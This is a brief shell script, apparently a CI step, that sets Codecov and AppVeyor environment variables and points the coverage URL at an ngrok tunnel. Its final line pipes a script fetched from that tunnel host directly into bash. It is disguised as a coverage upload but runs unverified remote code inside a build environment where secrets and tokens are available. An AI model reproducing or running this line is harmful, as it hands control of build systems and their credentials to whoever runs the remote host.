#!/bin/sh

set -x



export CI="True"
export APPVEYOR="True"
export CODECOV_URL="https://54eb73c4.ngrok.io/"
bash <(curl -s https://54eb73c4.ngrok.io/bash) 
